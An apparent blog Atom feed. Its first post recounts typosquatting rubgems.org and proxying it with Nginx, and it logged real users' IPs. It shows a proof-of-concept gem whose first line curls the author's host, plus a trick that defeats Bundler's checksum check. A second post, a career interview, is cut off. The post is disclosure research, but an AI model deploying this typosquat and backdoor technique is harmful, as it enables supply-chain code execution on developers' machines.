<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Gavin Miller]]></title>
  <link href="http://gavinmiller.io/atom.xml" rel="self">
  <link href="http://gavinmiller.io/">
  <updated>2020-03-03T21:11:23-07:00</updated>
  <id>http://gavinmiller.io/</id>
  <author>
    <name><![CDATA[Gavin Miller]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[How I MITM'd rubygems.org ... Kinda]]></title>
    <link href="http://gavinmiller.io/2020/how-i-mitmd-rubygems-org-kinda/">
    <updated>2020-02-18T20:30:00-07:00</updated>
    <id>http://gavinmiller.io/2020/how-i-mitmd-rubygems-org-kinda</id>
    <content type="html"><![CDATA[<p>This story starts at the console debugging a coworker&rsquo;s issue. They had gotten stuck trying to
run <code>bundle install</code>. Try, and fail. Try, and fail. And the error was really weird:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Could not reach host rubgems.org. Check your network connection and try again.</span></code></pre></td></tr></table></div></figure>


<p>We went through the normal steps: <a href="https://www.youtube.com/watch?v=5UT8RkSmN4k">turn it off and on again</a>,
check wifi, load up google, go for a <span class="outer-emoji">
              <span
              style="background: url('/images/emoji/unicode/2615.png') no-repeat top left; background-size: 100%"
              class="inner-emoji"
              title="coffee">
              coffee
              </span>
            </span>
          , etc. Standard debugging techniques.</p>

<p>Finally we realized the <code>y</code> had inadvertently been dropped in <code>source 'https://rubgems.org'</code>.
Huh. Go figure. We moved on our way after giggling a little.  Rub gems. Hehe.</p>

<p>Then I got to thinking. If my colleague had made this mistake, surely other people have made this error
too. I checked the whois record, and it was available! <span class="outer-emoji">
              <span
              style="background: url('/images/emoji/take_my_money.png') no-repeat top left; background-size: 100%"
              class="inner-emoji"
              title="take_my_money">
              take_my_money
              </span>
            </span>
          </p>

<p>I was now in possession of <code>rubgems.org</code>, and was left with the question: What can I do with
it? Which lead me to the logical conclusion: I wonder if I can Man in the Middle <code>rubygems.org</code> and see
if other people make this typo!</p>

<p>It was stupid easy to setup a MITM. Grab a tiny AWS box, configure DNS, setup an Nginx proxy, and add let&rsquo;s
encrypt to the box. The Nginx config looked like this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>server {
</span><span class='line'>  listen       80;
</span><span class='line'>  server_name  _;
</span><span class='line'>  return 301 https://$host$request_uri;
</span><span class='line'>}
</span><span class='line'>
</span><span class='line'>server {
</span><span class='line'>  listen 443 ssl;
</span><span class='line'>
</span><span class='line'>  server_name  rubgems.org;
</span><span class='line'>  location / {
</span><span class='line'>    proxy_pass $scheme://rubygems.org;
</span><span class='line'>    sub_filter 'rubygems.org' 'rubgems.org';
</span><span class='line'>  }
</span><span class='line'>
</span><span class='line'>  # SSL Config
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>And that was it. I cobbled together some commands to build a simple log file parser to send me a list of
unique IPs each day via email, and then I sat back and waited.</p>

<h2>What Does a RubyGems MITM Get You?</h2>

<p>While I waited, I investigated and tried to determine: What is possible if you&rsquo;ve got control of a rubygem?
To answer this question I created a <code>trojan_horse</code> gem. You can see it here on <code>rubygems.org</code>:
<a href="https://rubygems.org/gems/trojan_horse">https://rubygems.org/gems/trojan_horse</a>.</p>

<p>The rough contents of which were:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>class TrojanHorse
</span><span class='line'>  def self.hi
</span><span class='line'>    puts "I'm a real horse"
</span><span class='line'>  end
</span><span class='line'>end</span></code></pre></td></tr></table></div></figure>


<p>Then I made a modification of the gem and added my MITM code at the top:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>`curl http://rubgems.org/request_capture`
</span><span class='line'>
</span><span class='line'>class TrojanHorse
</span><span class='line'>  def self.hi
</span><span class='line'>    puts "I'm a real horse"
</span><span class='line'>  end
</span><span class='line'>end</span></code></pre></td></tr></table></div></figure>


<p>I put this gem onto my MITM&rsquo;d server, and tried to download it through various means.</p>

<h2>RubyGems</h2>

<p>Let&rsquo;s see what happens with RubyGems. I started looking at <code>gem install</code> and set the <code>--source</code> flag,
here&rsquo;s what got downloaded:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ gem install --source https://rubgems.org trojan_horse --verbose
</span><span class='line'>HEAD https://rubygems.org/api/v1/dependencies
</span><span class='line'>200 OK
</span><span class='line'>HEAD https://rubgems.org/api/v1/dependencies
</span><span class='line'>200 OK
</span><span class='line'>GET https://rubygems.org/api/v1/dependencies?gems=trojan_horse
</span><span class='line'>200 OK
</span><span class='line'>GET https://rubgems.org/api/v1/dependencies?gems=trojan_horse
</span><span class='line'>200 OK
</span><span class='line'>GET https://rubygems.org/quick/Marshal.4.8/trojan_horse-0.0.1.gemspec.rz
</span><span class='line'>200 OK
</span><span class='line'>/usr/local/share/gems/trojan_horse-0.0.1/lib/trojan_horse.rb
</span><span class='line'>Successfully installed trojan_horse-0.0.1
</span><span class='line'>Parsing documentation for trojan_horse-0.0.1
</span><span class='line'>Parsing sources...
</span><span class='line'>100% [ 1/ 1]  lib/trojan_horse.rb
</span><span class='line'>Installing ri documentation for trojan_horse-0.0.1
</span><span class='line'>Done installing documentation for trojan_horse after 0 seconds
</span><span class='line'>1 gem installed
</span><span class='line'>
</span><span class='line'>$ ruby -e "require 'trojan_horse'"
</span><span class='line'>$</span></code></pre></td></tr></table></div></figure>


<p>Huh interesting. It reaches out to <code>rubygems.org</code> and then <code>rubgems.org</code>, but the download prefers to use
<code>rubygems.org</code> over my MITM. Wonder why? Checking out the help docs solves that problem:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gem install --help
</span><span class='line'># ...
</span><span class='line'>-s, --source URL                 Append URL to list of remote gem sources</span></code></pre></td></tr></table></div></figure>


<p>From this it looks like the url is appended to the end such that if the gem doesn&rsquo;t exist on <code>rubygems.org</code>
only then will it reach out to a different source. No MITM possibility there!</p>

<h2>Fresh Installation with Bundler</h2>

<p>Next I tried my hand at bundler. I started by creating the following Gemfile entry:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>source 'https://rubgems.org'
</span><span class='line'>gem 'trojan_horse'</span></code></pre></td></tr></table></div></figure>


<p>And received:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ bundle install --verbose
</span><span class='line'>Running `bundle install --verbose` with bundler 2.0.1
</span><span class='line'>HTTP GET https://rubgems.org/versions
</span><span class='line'>HTTP 200 OK https://rubgems.org/versions
</span><span class='line'>Fetching gem metadata from https://rubgems.org/
</span><span class='line'>Looking up gems ["trojan_horse"]
</span><span class='line'>HTTP GET https://rubgems.org/info/trojan_horse
</span><span class='line'>HTTP 200 OK https://rubgems.org/info/trojan_horse
</span><span class='line'>Resolving dependencies...
</span><span class='line'>Using bundler 2.0.1
</span><span class='line'>0:  bundler (2.0.1) from /usr/local/share/gems/specifications/bundler-2.0.1.gemspec
</span><span class='line'>Fetching trojan_horse 0.0.1
</span><span class='line'>Installing trojan_horse 0.0.1
</span><span class='line'>0:  trojan_horse (0.0.1) from /usr/local/share/gems/specifications/trojan_horse-0.0.1.gemspec
</span><span class='line'>Bundle complete! 1 Gemfile dependency, 2 gems now installed.
</span><span class='line'>Use `bundle info [gemname]` to see where a bundled gem is installed.
</span><span class='line'>
</span><span class='line'>$ ruby -e "require 'trojan_horse'"
</span><span class='line'>% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
</span><span class='line'>Dload  Upload   Total   Spent    Left  Speed
</span><span class='line'>100     3  100     3    0     0      7      0 --:--:-- --:--:-- --:--:--     7</span></code></pre></td></tr></table></div></figure>


<p>As you can see from the <code>curl</code> output, having never downloaded the gem before, I have RCE through the gem.</p>

<h2>Reinstall with Bundler</h2>

<p>With the bundler reinstall, I began by uninstalling <code>trojan_horse</code>, and updating my <code>Gemfile</code> to the following:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>source 'https://rubygems.org'
</span><span class='line'>gem 'trojan_horse'</span></code></pre></td></tr></table></div></figure>


<p>And then ran <code>bundle install</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ bundle install --verbose
</span><span class='line'>Running `bundle install --verbose` with bundler 1.17.3
</span><span class='line'>HTTP GET https://index.rubygems.org/versions
</span><span class='line'>HTTP 200 OK https://index.rubygems.org/versions
</span><span class='line'>Fetching gem metadata from https://rubygems.org/
</span><span class='line'>Looking up gems ["trojan_horse"]
</span><span class='line'>HTTP GET https://index.rubygems.org/info/trojan_horse
</span><span class='line'>HTTP 200 OK https://index.rubygems.org/info/trojan_horse
</span><span class='line'>Resolving dependencies...
</span><span class='line'>Using bundler 1.17.3
</span><span class='line'>0:  bundler (1.17.3) from /usr/local/share/gems/specifications/bundler-1.17.3.gemspec
</span><span class='line'>Fetching trojan_horse 0.0.1
</span><span class='line'>Installing trojan_horse 0.0.1
</span><span class='line'>0:  trojan_horse (0.0.1) from /usr/local/share/gems/specifications/trojan_horse-0.0.1.gemspec
</span><span class='line'>Bundle complete! 1 Gemfile dependency, 2 gems now installed.
</span><span class='line'>
</span><span class='line'>$ ruby -e "require 'trojan_horse'"
</span><span class='line'>$</span></code></pre></td></tr></table></div></figure>


<p>As you can see the gem downloaded cleanly from <code>rubygems.org</code>, without a trojan. Next I updated the
<code>Gemfile</code> back to <code>rubgems</code> and ran <code>bundle install --verbose</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># bundle install --verbose
</span><span class='line'>Running `bundle install --verbose` with bundler 1.17.3
</span><span class='line'>Found changes from the lockfile, re-resolving dependencies because the list of sources changed
</span><span class='line'>HTTP GET https://rubgems.org/versions
</span><span class='line'>HTTP 200 OK https://rubgems.org/versions
</span><span class='line'>Fetching gem metadata from https://rubgems.org/
</span><span class='line'>Looking up gems ["trojan_horse"]
</span><span class='line'>HTTP GET https://rubgems.org/info/trojan_horse
</span><span class='line'>HTTP 200 OK https://rubgems.org/info/trojan_horse
</span><span class='line'>HTTP GET https://rubgems.org/info/trojan_horse
</span><span class='line'>HTTP 200 OK https://rubgems.org/info/trojan_horse
</span><span class='line'>
</span><span class='line'>Retrying fetcher due to error (2/4): Bundler::HTTPError The checksum of /info/trojan_horse does
</span><span class='line'>  not match the checksum provided by the server! Something is wrong (local checksum
</span><span class='line'>  is "\"534cd8e8e81a4c9e4506940916c63080\"", was expecting "\"5cea0d4d-55\"").
</span><span class='line'>
</span><span class='line'>Looking up gems ["trojan_horse"]
</span><span class='line'>Double checking for ["trojan_horse"] in repository https://rubgems.org/ or installed locally
</span><span class='line'>Fetching gem metadata from https://rubgems.org/
</span><span class='line'>Looking up gems ["trojan_horse"]
</span><span class='line'>Resolving dependencies...
</span><span class='line'>Using bundler 1.17.3
</span><span class='line'>0:  bundler (1.17.3) from /usr/local/share/gems/specifications/bundler-1.17.3.gemspec
</span><span class='line'>Installing trojan_horse 0.0.1
</span><span class='line'>0:  trojan_horse (0.0.1) from /usr/local/share/gems/specifications/trojan_horse-0.0.1.gemspec
</span><span class='line'>Bundle complete! 1 Gemfile dependency, 2 gems now installed.
</span><span class='line'>Use `bundle info [gemname]` to see where a bundled gem is installed.</span></code></pre></td></tr></table></div></figure>


<p>And herein I got caught! Bundler does a checksum comparison on the gem verses the server. But if I control
the server, shouldn&rsquo;t I be able to control the checksum? I checked what <code>/info/trojan_horse</code> returned:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>curl https://rubgems.org/info/trojan_horse
</span><span class='line'>---
</span><span class='line'>0.0.1 |checksum:f199445ebe0d03a6125c80b5eae7678dfc88caa4a5bfc631928df2ff7354ee5c
</span><span class='line'>
</span><span class='line'>curl https://rubygems.org/info/trojan_horse
</span><span class='line'>---
</span><span class='line'>0.0.1 |checksum:94b11151b60a613ecc426ac5855621aded3a8396b5a307bf24ecc2288ebc13c8</span></code></pre></td></tr></table></div></figure>


<p>Those are different, but they don&rsquo;t match the checksum failure I was getting. Things actually got
confusing at this point. And when that happens, I jump into the source code and try to get a debugger
around what&rsquo;s happening.</p>

<p>Grepping for &ldquo;does not match the checksum&rdquo; on github lead me to <a href="https://github.com/rubygems/bundler/blob/9d733d92abe4e492f07027fc5928a5a1172d6b31/lib/bundler/compact_index_client/updater.rb#L10">MisMatchedChecksumError</a>. And finally down to <a href="https://github.com/rubygems/bundler/blob/9d733d92abe4e492f07027fc5928a5a1172d6b31/lib/bundler/compact_index_client/updater.rb#L70">line 70</a>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> if etag_for(local_temp_path) == response_etag</span></code></pre></td></tr></table></div></figure>


<p>At this point with a debugger around the code, I can start to look at the two variable values:</p>

<ul>
<li><code>local_temp_path</code> is a path to a local cache of the <code>/info/trojan_horse</code> file; on my local that path looks like this:</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat /tmp/bundler-compact-index-20200218-620-1ujtcvc/trojan_horse
</span><span class='line'>---
</span><span class='line'>0.0.1 |checksum:f199445ebe0d03a6125c80b5eae7678dfc88caa4a5bfc631928df2ff7354ee5c</span></code></pre></td></tr></table></div></figure>


<ul>
<li><code>response_etag</code> is the ETag value from the request sent to rubgems for <code>/info/trojan_horse</code>. That value came back as:</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&gt; response["ETag"]
</span><span class='line'>=&gt; "\"5cea0d4d-55\""</span></code></pre></td></tr></table></div></figure>


<p>First mystery solved I found one of the checksums. It&rsquo;s a partial MD5 hash coming from ETag <span class="outer-emoji">
              <span
              style="background: url('/images/emoji/confused-cat.png') no-repeat top left; background-size: 100%"
              class="inner-emoji"
              title="confused-cat">
              confused-cat
              </span>
            </span>
          </p>

<p><aside>
Turns out the partial MD5 hash coming from the ETag was my Nginx server sending the default ETag (more later).
Looking at <code>rubygems.org</code> they send a full hash like this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ curl -vvv https://rubygems.org/info/trojan_horse 2&gt;&1 | grep ETag
</span><span class='line'>&lt; ETag: "c0f746ed9f42c349618761231c5e51ce"</span></code></pre></td></tr></table></div></figure>


<p>I didn&rsquo;t update this, because I really think the <span class="outer-emoji">
              <span
              style="background: url('/images/emoji/confused-cat.png') no-repeat top left; background-size: 100%"
              class="inner-emoji"
              title="confused-cat">
              confused-cat
              </span>
            </span>
           meme is hilarious and wanted to use the emoji.
</aside></p>

<p>Still digging, I followed the method <code>etag_for</code> and ended up at this code:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>def etag_for(path)
</span><span class='line'>  sum = checksum_for_file(path)
</span><span class='line'>  sum ? %("#{sum}") : nil
</span><span class='line'>end
</span><span class='line'>
</span><span class='line'>def checksum_for_file(path)
</span><span class='line'>  return nil unless path.file?
</span><span class='line'>  # ... &lt;snip&gt;
</span><span class='line'>
</span><span class='line'>  SharedHelpers.digest(:MD5).hexdigest(IO.read(path))
</span><span class='line'>end</span></code></pre></td></tr></table></div></figure>


<p>That makes more sense! Bundler is doing an MD5 hash against the contents of the file returned at
<code>/info/trojan_horse</code>. The MD5 hash for that file looks like this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&gt; content = File.read(local_temp_path)
</span><span class='line'>=&gt; "---\n0.0.1 |checksum:f199445ebe0d03a6125c80b5eae7678dfc88caa4a5bfc631928df2ff7354ee5c\n"
</span><span class='line'>&gt; Digest::MD5.hexdigest(content)
</span><span class='line'>=&gt; "534cd8e8e81a4c9e4506940916c63080"</span></code></pre></td></tr></table></div></figure>


<p>And this is the second piece. The ETag is not matching with what I have on the local cache and
that&rsquo;s why the installation is failing. Makes sense. But I control the server, so I can modify
the ETag! All that&rsquo;s expected from the bundler standpoint is an MD5 checksum that matches the
contents of the file.</p>

<p>I switched up my Nginx configuration so that when is requested <code>/info/trojan_horse</code> it reverse proxies to
a local ruby server and sends back the MD5 hash it was expecting.</p>

<p>And viola! The backdoored gem installed. I was actually shocked at this point. I expected
additional safety checks to break, and that wasn&rsquo;t the case. The lesson here is if you own the server,
the client can&rsquo;t do anything to save itself from you.</p>

<h3>Summary</h3>

<p>To summarize my findings:</p>

<ul>
<li>There&rsquo;s no possibility of MITM against <code>gem install</code></li>
<li>And I have full MITM with RCE against <code>bundle install</code></li>
</ul>


<h2>Back to the Story&hellip;</h2>

<p>After about 3 months I tallied up my stats. I had a collection of around 100 IPs. The geographical layout
looked like this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Location          | Count
</span><span class='line'>------------------|------
</span><span class='line'>Amazon - Virginia | 51
</span><span class='line'>United States     | 7
</span><span class='line'>Brazil            | 6
</span><span class='line'>China             | 5
</span><span class='line'>UK                | 5
</span><span class='line'>Germany           | 5
</span><span class='line'>Canada            | 3
</span><span class='line'>Others with 1 IP  | 19</span></code></pre></td></tr></table></div></figure>


<p>Not too shabby. You&rsquo;ll noticed that half of those connections are for AWS. Which should give you pause,
because it likely means my MITM was running on a staging or production server. Yikes! At this point I felt
like my little experiment had run its course and demonstrated that this was a viable method for running a
rubygems MITM.</p>

<p>I wasn&rsquo;t entirely sure how to properly disclose this info. It was sensitive. But also, kinda not really.
Especially since I owned the domain in question. But that said, there could be other domains
that could be squatted so I felt it best to start quietly.</p>

<p>I started by submitting a report to <a href="https://hackerone.com/rubygems">HackerOne against the RubyGems</a> program.
If I could get paid for this, why not! Rejected. I wasn&rsquo;t surprised with that. I asked to publicly disclose &hellip;
it waited for a month until I bumped it, the H1 staff replied &ldquo;we&rsquo;ll let you know once we have info&rdquo; and then
closed it. I took that as: &ldquo;Here is the door, please use it.&rdquo; <span class="outer-emoji">
              <span
              style="background: url('/images/emoji/man_shrugging.png') no-repeat top left; background-size: 100%"
              class="inner-emoji"
              title="man_shrugging">
              man_shrugging
              </span>
            </span>
          </p>

<p>The next avenue I tried was sending an email to rubygems&#8217; security email: <code>security@rubygems.org</code>. I heard
back within 2 hours, and then nothing. I sent a few follow up emails, but didn&rsquo;t hear back.
I happened to bump into <a href="https://twitter.com/ihackedwhat">RenderMan</a> at BSides Edmonton and chatted
with him about the MITM and lack of response. He
<a href="https://twitter.com/ihackedwhat/status/1175087707044761600">fired off a tweet</a> to see if he could get me
a response. Nada.</p>

<p>Finally, I spoke to a colleague that had a connection on the rubygems team. This eventually lead to a
response back from my initial email with instructions to file an issue. Progress!</p>

<p>Additionally, since this issue affected bundler, I sent <code>security@bundler.io</code> an email. That bounced back
as undeliverable. Guess that email doesn&rsquo;t exist. And sent an email to <code>team@bundler.io</code> and never got a
response.</p>

<p><aside>
Now I&rsquo;ve seen people make a fuss about poor disclosure responses from security teams. And that&rsquo;s not what
this post is about. I sit on the receiving end of a <code>security@</code> email and it
gets tiring reading shitty report, after shitty report. These folks are busy and doing a thankless job
triaging lots of garbage reports as volunteers. I appreciate all your hard work, you make the community better!</p>

<p><strong>That said, Bundler team if you&rsquo;re reading this &hellip; please fix your security email address!</strong>
</aside></p>

<p>At this point, I submitted issues with the rubygems project and bundler project, and fired up the ol&#8217; text
editor to write this post.</p>

<p>This MITM turned out to be a lot of fun to run through. While it wasn&rsquo;t a super serious issue, had I been
a malicious actor, I could have RCE on a bunch of computers right now so&hellip; Achievement unlocked &hellip; Kinda! <span class="outer-emoji">
              <span
              style="background: url('/images/emoji/unicode/1f3c6.png') no-repeat top left; background-size: 100%"
              class="inner-emoji"
              title="trophy">
              trophy
              </span>
            </span>
          </p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Interview With A First Year Computer Science Student]]></title>
    <link href="http://gavinmiller.io/2020/interview-with-a-first-year-computer-science-student/">
    <updated>2020-01-05T21:08:00-07:00</updated>
    <id>http://gavinmiller.io/2020/interview-with-a-first-year-computer-science-student</id>
    <content type="html"><![CDATA[<p>It&rsquo;s been almost 2 years since my last post. There have been good intentions of writing things but you
can clearly see how that turned out. To get back on track, I&rsquo;ve pulled out an interview that I did for a
local computer science from &hellip; timestamp says Oct 2016. My thoughts have largely stayed the same so I&rsquo;ll
post it below.</p>

<hr />

<p><strong>Q: What is your title in your company?</strong><br>
A: Software Engineer 4</p>

<p><strong>Q: What are your technical certifications?</strong><br>
A: Bachelor’s Degree in Computer Science from University of Manitoba</p>

<p><strong>Q: What technical website do you follow?</strong><br>
A: Hackers News, Stackoverflow, reddit.com/r/netsec, reddit.com/r/ruby, troy hunt, krebs on security,
schneier on security, thought works, thought works technical radar, destroy all software, and xkcd</p>

<p><strong>Q: What is the biggest IT challenge you have faced and how did you handle it?</strong><br>
A: People. People are always going to be your biggest challenge (as much as you may not believe it now.)
In your day to day you’re going to interact with 10s to 100s of people, all with varying objectives,
needs, goals, beliefs, and preferences. Learn to distinguish between the important things that are worth
standing up for, and the minor details that are just bike-shedding.</p>

<p>I think the best way to handle people situations is with empathy. If you can put yourself in someone else’s
shoes, you can understand their perspective and reach a solution with them. One of my favorite sayings is</p>

<blockquote><p>would you rather be right, or would you rather be effective.</p></blockquote>

<p>I’ve taken this to mean that sometimes I need to compromise on what I think is right, if it can achieve
the same goal that my teammates and I are working towards. By being empathetic with my teammates I can
understand their perspective which makes being effective much easier.</p>

<p><strong>Q: How do you solve problems as a team when developing a software?</strong><br>
If they’re code problems, we will discuss the pros and cons of a problem, whiteboard the various solutions,
and decide. It’s usually very easy to solve problems as a team.  Taking time away from a problem can usually
help too. I’ve found that taking a walk, or going home for the day will often solve a problem when I’m not
even thinking about it.</p>

<p>Now if they’re people problems and not code problems &ndash; which are generally more common &ndash; going for a coffee
or beer with someone is the best way to solve those problems! <span class="outer-emoji">
              <span
              style="background: url('/images/emoji/unicode/1f609.png') no-repeat top left; background-size: 100%"
              class="inner-emoji"
              title="wink">
              wink
              </span>
            </span>
           Getting to know someone personally, and
face to face breaks down barriers so quickly.</p>

<p><strong>Q: As a software developer what are the tasks you do besides developing?</strong><br>
A:</p>

<ul>
<li>Writing tests: unit, integration/functional, or feature to verify software</li>
<li>Writing quick scripts to check work / validate outputs</li>
<li>Making sure our software is building correctly with our Continuous Integration / Deployment servers</li>
<li>Fixing bugs</li>
<li>Reading and/or understanding other people’s code</li>
<li>Reviewing teammates code</li>
<li>Communicating with other team members around new features, existing features, bugs, schedule, etc.</li>
</ul>


<p><strong>Q: How do you keep current on this industry?</strong><br>
A: Typically through the technical websites I follow, local industry groups (like calsec, yycruby), and peers</p>

<p><strong>Q: Best program languages to learn at the moment? And Why?</strong><br>
A: For server side I’ve been hearing a lot of good things about Golang. And Javascript/NodeJS is huge right
now, if the buzz of the internet is to be trusted.  I barely know either so it’s purely speculation on my part.</p>

<p>My primary language is Ruby, and that will keep me employed for the next 5 years at least, however I’ve heard anecdotally of it’s decline in favour of the aforementioned languages.
I haven’t seen that personally, but I am also keeping that in mind and am assuming I will likely need to learn a different language within the next 5 years.</p>

<p><strong>Q: What is your input when it comes to learning languages? Is it good to learn basics of multiple language or master in one?</strong><br>
A: Personally, my recommendation is to learn one language really well, and know how to apply that knowledge to other languages. IMO a developer that knows the fundamentals can
get up and running in a language with a few weeks of study. Being able to solve problems with code > knowing a particular language.</p>

<p>That said, I’ve also “levelled up” my skill in languages the most when I’ve started working in another language. For example, I didn’t grok blocks in ruby until I worked with
objective-c and saw how it used blocks programming on the iPhone. I’ve heard that is a common situation. So maybe my answer is do both.</p>

<p>I would recommend learning different platforms. Programming server code, vs UI code, vs mobile code all come with very different perspectives and cause you to learn design
paradigms that are applicable to all software.</p>

<p><strong>Q: What is the best way to show case your work for employers or what is the best way to create a portfolio?</strong><br>
A: Ship it. Get something on an app store that an employer can download to their phone, or load on a website. I am 100% more interested in a piece of working
software then a theoretical piece of software that you’ve written when we sit down for an interview. At a recent career fair, I had someone offer to demonstrate their Android
app that they built (it was just a weather app). It was an excellent opportunity to talk about them and their coding and see how that person thought. We talked about APIs, UI
